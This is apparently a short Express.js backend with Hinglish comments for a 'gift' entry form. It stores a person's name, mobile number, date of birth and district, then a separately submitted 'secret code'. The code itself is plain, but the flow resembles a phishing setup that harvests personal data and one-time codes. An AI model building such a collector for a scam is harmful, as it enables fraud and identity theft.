const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// JSON data receive karne ke liye
app.use(express.json());

// Frontend files serve karega
app.use(express.static(path.join(__dirname)));

// Temporary memory database
const entries = [];

// FORM 1 — Continue par data save
app.post("/api/register", (req, res) => {
  const { name, mobile, dob, district } = req.body;

  if (!name || !mobile || !dob || !district) {
    return res.status(400).json({
      success: false,
      message: "All fields are required."
    });
  }

  const entry = {
    id: "GIFT-" + Date.now(),
    name,
    mobile,
    dob,
    district,
    secretCode: null,
    createdAt: new Date().toISOString()
  };

  entries.push(entry);

  res.json({
    success: true,
    entryId: entry.id
  });
});

// FORM 2 — Submit par Secret Code save
app.post("/api/secret-code", (req, res) => {
  const { entryId, secretCode } = req.body;

  if (!entryId || !secretCode) {
    return res.status(400).json({
      success: false,
      message: "Entry ID and Secret Code are required."
    });
  }

  const entry = entries.find(item => item.id === entryId);

  if (!entry) {
    return res.status(404).json({
      success: false,
      message: "Entry not found."
    });
  }

  entry.secretCode = secretCode;

  res.json({
    success: true,
    message: "Entry submitted successfully."
  });
});

// Server start
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});